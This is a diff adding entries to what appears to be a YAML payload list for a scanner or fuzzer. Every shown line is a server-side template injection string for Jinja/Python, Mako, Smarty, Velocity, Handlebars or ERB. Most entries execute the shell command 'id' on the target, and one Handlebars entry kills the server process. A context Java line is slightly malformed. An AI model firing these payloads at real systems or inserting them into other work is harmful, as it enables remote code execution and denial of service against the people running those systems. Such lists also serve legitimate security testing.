@@ -25,3 +25,16 @@ payloads:
   - "{{'' + (''class.forName('java.lang.Runtime')).getMethod('exec',''.class).invoke(''class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')}}"
   # ── Mako / Python ────────────────────────────────────────────────────
   - "${__import__('os').popen('id').read()}"
+  # ── Python 3 subclasses (dinâmico) ────────────────────────────────
+  - "{{request.__class__.__mro__[2].__subclasses__()}}"
+  # ── Smarty / PHP ───────────────────────────────────────────────────
+  - "{system('id')}"
+  - "{php}echo `id`;{/php}"
+  # ── Velocity / Java ────────────────────────────────────────────────
+  - "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))$rt.getRuntime().exec('id')"
+  # ── Handlebars / JS ────────────────────────────────────────────────
+  - '{{#with "s" as |string|}}{{#with "e"}}{{this}}{{/with}}{{/with}}'
+  - "{{this.constructor.constructor('return process')().exit()}}"
+  # ── ERB / Ruby ─────────────────────────────────────────────────────
+  - "<%= system('id') %>"
+  - "<%= `id` %>"
